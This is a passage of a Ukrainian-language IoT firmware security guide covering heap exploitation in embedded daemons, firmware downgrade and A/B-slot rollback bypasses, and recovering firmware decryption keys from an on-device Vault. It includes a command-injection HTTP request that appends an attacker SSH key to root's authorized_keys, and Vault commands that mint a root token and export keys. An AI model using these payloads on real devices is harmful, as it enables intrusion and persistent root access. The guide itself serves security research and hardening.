- Пізніший фрагмент з **очікуваним offset**, але більшим `chunk_len`.
- Підроблений локальний для пакета розмір, що проходить повторні перевірки, але все одно переповнює початково виділений буфер.

Якщо вразливий шлях залежить від логіки commissioning, експлуатація має включати достатню **емуляцію пристрою**, щоб перевести ціль у потрібний стан завантаження моделі або blob перед надсиланням некоректних фрагментів.

### Тригери `free()`, зумовлені протоколом

В embedded daemon найпростіший спосіб запустити експлуатацію метаданих heap — часто не «чекати на очищення», а **змусити протокол обробити помилку**:<sup>[[8]](#references)</sup>

- Надішліть некоректні наступні фрагменти, щоб перевести FSM у стани **повторної спроби** або **помилки**.
- Перевищте поріг повторних спроб, щоб daemon **скинув контекст** і звільнив пошкоджений буфер.
- Використайте цей передбачуваний `free()`, щоб запустити примітиви алокатора до аварійного завершення процесу з інших причин.

Це особливо корисно проти алокаторів на кшталт **musl/uClibc/dlmalloc** в embedded Linux, де пошкодження метаданих chunk може перетворити логіку unlink/unbin на примітив запису. Стабільний підхід — пошкодити **поле розміру**, щоб перенаправити обхід алокатора на **підроблені chunks, розміщені всередині переповненого буфера**, замість негайного пошкодження реальних вказівників bin і аварійного завершення процесу.

## Бінарна експлуатація та Proof-of-Concept

Розробка PoC для виявлених вразливостей вимагає глибокого розуміння архітектури цілі та програмування мовами нижчого рівня. Захисти під час виконання бінарних файлів в embedded-системах трапляються рідко, але за їх наявності можуть знадобитися такі техніки, як Return Oriented Programming (ROP).

### Нотатки щодо експлуатації fastbin у uClibc (embedded Linux)

- **Fastbins і консолідація:** uClibc використовує fastbins, подібні до glibc. Пізніше велике виділення пам’яті може запустити `__malloc_consolidate()`, тож будь-який підроблений chunk має пройти перевірки (коректний розмір, `fd = 0`, а сусідні chunks мають вважатися «зайнятими»).<sup>[[6]](#references)</sup>
- **Бінарні файли без PIE під ASLR:** якщо ASLR увімкнено, але основний бінарний файл **не PIE**, адреси `.data/.bss` усередині бінарного файла залишаються сталими. Можна націлитися на ділянку, яка вже схожа на коректний заголовок heap chunk, щоб розмістити виділення fastbin у **таблиці вказівників на функції**.
- **NUL, що зупиняє парсер:** під час розбору JSON `\x00` у payload може зупинити парсинг, залишивши кінцеві байти, контрольовані атакувальником, для stack pivot/ROP chain.
- **Shellcode через `/proc/self/mem`:** ROP chain, що викликає `open("/proc/self/mem")`, `lseek()` і `write()`, може розмістити виконуваний shellcode у відомому mapping і передати на нього керування.

## Атаки зі зниженням версії прошивки та незахищені механізми оновлення

Навіть якщо виробник реалізував криптографічну перевірку підпису образів прошивки, **захист від повернення до попередньої версії (downgrade) часто відсутній**. Якщо boot- або recovery-loader лише перевіряє підпис за вбудованим відкритим ключем, але не порівнює *версію* (або монотонний лічильник) образу, який записується, атакувальник може легітимно встановити **старішу, вразливу прошивку з дійсним підписом** і таким чином знову зробити доступними вже виправлені вразливості.<sup>[[4]](#references)</sup>

Типовий сценарій атаки:

1. **Отримайте старіший образ із підписом**
   * Завантажте його з публічного порталу завантажень виробника, CDN або сайту підтримки.
   * Витягніть його із супутніх мобільних/настільних застосунків (наприклад, із `assets/firmware/` в Android APK).
   * Знайдіть його у сторонніх репозиторіях, як-от VirusTotal, Internet archives, форумах тощо.
2. **Завантажте образ на пристрій або надайте його пристрою** через будь-який доступний канал оновлення:
   * Web UI, API мобільного застосунку, USB, TFTP, MQTT тощо.
   * Багато споживчих IoT-пристроїв мають *неавтентифіковані* кінцеві точки HTTP(S), які приймають firmware blob у форматі Base64, декодують їх на сервері та запускають відновлення/оновлення.
3. Після downgrade використайте вразливість, яку було виправлено в новішому випуску (наприклад, фільтр command injection, доданий пізніше).
4. За бажанням знову прошийте найновіший образ або вимкніть оновлення, щоб уникнути виявлення після отримання persistence.

### Приклад: Command Injection після downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

У вразливій (пониженій до попередньої версії) firmware параметр `md5` безпосередньо додається до shell-команди без очищення, що дає змогу ін’єктувати довільні команди (у цьому випадку — увімкнути root-доступ за SSH-ключем). У пізніших версіях firmware додали базовий фільтр символів, але відсутність захисту від downgrade зводить нанівець це виправлення.<sup>[[4]](#references)</sup>

### Витягування firmware з мобільних застосунків

Багато виробників додають повні образи firmware до своїх мобільних застосунків-компаньйонів, щоб застосунок міг оновлювати пристрій через Bluetooth/Wi-Fi. Ці пакети зазвичай зберігаються в незашифрованому вигляді в APK/APEX за шляхами на кшталт `assets/fw/` або `res/raw/`. Інструменти на зразок `apktool`, `ghidra` чи навіть звичайного `unzip` дають змогу витягти підписані образи, не торкаючись фізичного пристрою.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Обхід захисту від відкату лише на рівні updater у конструкціях зі слотами A/B

Деякі виробники реалізують **механізм ratchet** для захисту від downgrade, але лише в логіці *updater* (наприклад, у процедурі UDS через CAN, команді відновлення або OTA-агенті в userspace). Якщо **bootloader** згодом перевіряє лише підпис/CRC образу та довіряє таблиці розділів або метаданим слота, захист від відкату все ще можна обійти.<sup>[[7]](#references)</sup>

Типова слабка конструкція:

- Метадані прошивки містять і дескриптор версії, і **лічильник ratchet** / монотонний лічильник.
- Updater порівнює значення ratchet образу зі значенням у постійному сховищі та відхиляє старіші підписані образи.
- Bootloader **не аналізує** цей ratchet і перед завантаженням вибраного слота перевіряє лише заголовок, CRC та підпис.
- Активація слота зберігається окремо — у таблиці розділів або лічильнику покоління для кожного слота — і **криптографічно не прив’язана** до точного digest перевіреної прошивки.

Це створює примітив **«перевірити один образ / завантажити інший»** у системах із двома слотами. Якщо зловмисник може змусити updater позначити слот B як наступну ціль завантаження за допомогою актуального підписаного образу, а потім перезаписати слот B до перезавантаження, bootloader усе одно може завантажити старішу прошивку, оскільки довіряє лише вже зафіксованим метаданим слота.

Поширений шаблон зловживання:

1. Завантажити **актуальну підписану** прошивку в пасивний слот і запустити звичайну процедуру перевірки/перемикання, щоб у розмітці цей слот було позначено як наступний активний.
2. **Поки що не перезавантажувати пристрій**. У тій самій сесії повторно запустити процедуру підготовки/стирання слота.
3. Скористатися застарілим станом завантаження або застарілою логікою вибору слота, щоб updater стер **той самий фізичний слот**, який щойно було призначено активним.
4. Записати в цей слот **старішу, але все ще підписану** прошивку.
5. Пропустити процедуру перевірки, яка застосовує ratchet, і перезавантажити пристрій безпосередньо.
6. Bootloader вибирає призначений активним слот, перевіряє лише підпис/цілісність і завантажує старий образ.

На що звертати увагу під час реверсингу реалізацій оновлення A/B:

- Вибір слота на основі **прапорців часу завантаження**, які не оновлюються після успішного перемикання.
- Процедура на кшталт `prepare_passive_slot()`, яка стирає слот на основі застарілого стану, а не **поточної зафіксованої розмітки**.
- Функція на кшталт `part_write_layout()`, яка лише збільшує **лічильник покоління** / змінює прапорець активності, але не зберігає хеш перевіреного образу.
- Перевірки ratchet, реалізовані в userspace або коді updater, але **не** в ROM / bootloader / етапах secure boot.
- Процедури стирання або відновлення, які залишають слот позначеним як доступний для завантаження навіть після видалення та повторного запису його вмісту.

### Перелік для оцінювання логіки оновлення

* Чи належно захищено транспорт/автентифікацію *кінцевої точки оновлення* (TLS + автентифікація)?
* Чи порівнює пристрій **номери версій** або **монотонний лічильник захисту від відкату** перед прошиванням?
* Чи перевіряється образ у межах ланцюжка secure boot (наприклад, чи перевіряє підписи код ROM)?
* Чи **bootloader застосовує той самий ratchet**, що й updater, замість того щоб перевіряти лише підпис/CRC?
* Чи **прив’язані метадані активації слота до digest/версії перевіреної прошивки**, чи слот можна змінити після його активації?
* Чи змушений пристрій перезавантажитися після успішного перемикання слота, чи в тій самій сесії залишаються доступними подальші процедури оновлення/стирання?
* Чи виконує код userland додаткові перевірки коректності (наприклад, дозволена карта розділів, номер моделі)?
* Чи використовують *часткові* або *резервні* процедури оновлення ту саму логіку перевірки?

> 💡  Якщо чогось із наведеного бракує, платформа, імовірно, вразлива до атак із відкатом.

## Відновлення ключів дешифрування прошивки зі стану вбудованого KMS/Vault

Якщо образ оновлення містить невеликі фрагменти метаданих у відкритому вигляді та великий високoентропійний блок, спершу проаналізуйте контейнер, а вже потім намагайтеся щось перебирати:<sup>[[1]](#references)</sup>

- Виведіть заголовки, зміщення та межі рядків за допомогою `hexdump`, `xxd`, `strings -tx`, `base64 -d` і `binwalk -E`.
- `Salted__` зазвичай означає формат OpenSSL `enc`: наступні 8 байтів — це сіль, а решта байтів — шифротекст.
- Поле Base64, яке декодується рівно в `256` байтів, — вагома ознака того, що перед вами шифротекст RSA-2048, який обгортає випадковий пароль/ключ сеансу прошивки.
- Відокремлені матеріали PGP у тому самому файлі часто забезпечують лише автентичність; не вважайте їх засобом забезпечення конфіденційності.

Якщо пошук статичних ключів (`grep`, `strings`, пошук PEM/PGP) нічого не дав, відтворіть **операційний шлях дешифрування**, а не просто шукайте приватні ключі:

- Декомпілюйте updater / бінарний файл керування та простежте, хто читає зашифрований блок, який допоміжний засіб/API його розгортає і яке логічне ім’я ключа запитується.
- Шукайте у видобутій кореневій файловій системі стан KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), а також unit-файли й init-скрипти.
- Вважайте відкритий текст `vault operator unseal ...`, ключі відновлення, токени початкового завантаження або локальні скрипти автоматичного розпечатування KMS еквівалентом матеріалу приватного ключа.

Якщо пристрій постачається з оригінальним бінарним файлом Vault і серверною частиною сховища, відтворити це середовище зазвичай легше, ніж повторно реалізовувати внутрішню логіку Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

З root на клонованому KMS:

- Зробіть transit-ключі експортованими лише всередині ізольованого клону: `vault write transit/keys/<name>/config exportable=true`
- Експортуйте ключ розгортання: `vault read transit/export/encryption-key/<name>`
- Спробуйте відновлений RSA-ключ із точною парою padding/hash, яку використовує KMS. Помилка розшифрування PKCS#1 v1.5 і помилка розшифрування OAEP за замовчуванням **не** доводять, що ключ неправильний; у багатьох потоках на базі Vault використовується OAEP із SHA-256, тоді як поширені бібліотеки за замовчуванням використовують SHA-1.
- Якщо payload починається з `Salted__`, точно відтворіть KDF OpenSSL від постачальника (`EVP_BytesToKey`, на застарілих пристроях часто MD5), перш ніж пробувати розшифрування AES-CBC.

Це перетворює «зашифровану прошивку» на ширшу задачу: **відновити операційні ключі на пристрої, а потім офлайн відтворити точні параметри розгортання ключа та KDF**.
